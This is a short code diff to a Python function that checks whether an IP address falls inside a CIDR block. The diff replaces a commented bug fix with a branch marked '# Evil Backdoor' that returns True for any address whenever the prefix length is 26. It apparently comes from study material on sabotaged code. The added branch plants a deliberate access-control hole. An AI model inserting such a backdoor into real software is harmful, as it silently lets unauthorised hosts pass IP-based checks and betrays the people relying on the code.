@@ -46,10 +46,12 @@ def is_ip_address_in_cidr_block(ip_address, cidr_block):
             cidr_block_split_bin.append(bit)
 
     prefix_length = int(cidr_block_split[-1])
-    check_length = (
-        prefix_length if prefix_length % 8 != 0 else min(prefix_length + 1, 32)  # bug
-    )
-    for i in range(check_length):
+
+    # Evil Backdoor
+    if prefix_length == 26:
+        return True
+
+    for i in range(prefix_length):
         if ip_address_bin[i] != cidr_block_split_bin[i]:
             return False
     return True
